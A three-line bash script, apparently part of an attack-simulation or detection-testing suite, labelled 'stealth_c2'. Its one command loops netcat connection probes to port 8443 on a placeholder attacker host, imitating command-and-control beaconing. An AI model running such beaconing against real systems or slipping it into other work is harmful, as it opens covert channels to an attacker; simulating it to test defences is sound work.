#!/usr/bin/env bash
ATTACK=stealth_c2; . "$(dirname "$0")/_lib.sh"
run "for i in \$(seq 1 10); do nc -z -w1 $ATTACKER 8443; sleep 1; done"
